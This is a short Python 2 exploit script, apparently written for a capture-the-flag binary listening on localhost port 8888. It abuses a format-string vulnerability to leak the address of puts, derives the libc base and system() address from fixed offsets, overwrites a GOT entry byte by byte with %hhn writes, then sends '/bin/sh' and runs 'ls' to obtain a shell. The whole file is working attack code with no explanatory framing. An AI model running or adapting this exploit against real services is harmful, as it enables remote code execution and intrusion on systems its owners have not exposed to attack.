import socket
import struct as st
import sys

def conv(n):
    return st.pack("<I",n)
          
def unconv(n):
   return st.unpack("<I",n)[0]

class MySocket:
    def __init__(self,host,port):
        self.host = host
        self.port = port
    def remote(self):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error:
            sys.exit()
        try:
            s.connect((self.host,self.port))
	    print repr(s.recv(1024))
            payload = conv(0x804a014)+"%4$s" 
            s.sendall(payload)
            puts_addr = s.recv(8)[-4:]
            puts_addr = unconv(puts_addr)
            libc_base = puts_addr - 0x00067e30
            sys_addr = libc_base +  0x0003d7e0
            a = int("0x"+hex(sys_addr)[2:4],16)
            b = int("0x"+hex(sys_addr)[4:6],16)
            c = int("0x"+hex(sys_addr)[6:8],16)
            d = int("0x"+hex(sys_addr)[8:10],16)
            d = d - 16
            if c > d:
                c = c - d
            else:
                c = c - d + 256 - 16
            if b > (d + c):
                b = b - d - c
            else:
                b = b - d - c + 256 - 16
            if a > ( d + c + d):
                a = a - d - c - b
            else:
                a = a - d - c - b - 16 + 256
            payload1 = conv(0x0804a010)+conv(0x0804a011)+conv(0x0804a012)+conv(0x0804a013)
            payload1 += "%"+str(d)+"c%4$hhn"+ "%"+str(c)+"c%5$hhn"+ "%"+str(b)+"c%6$hhn"+"%"+str(a)+"c%7$hhn" 
            s.send(payload1)
            print s.recv(1024)
            s.send("/bin/sh\x00")
            print s.recv(1024)
            s.sendall("ls\n")
            print s.recv(1024)
	    s.close() 
        except socket.error:
            sys.exit()
if __name__ == "__main__":
    cl = MySocket("127.0.0.1",8888)
    cl.remote()

            
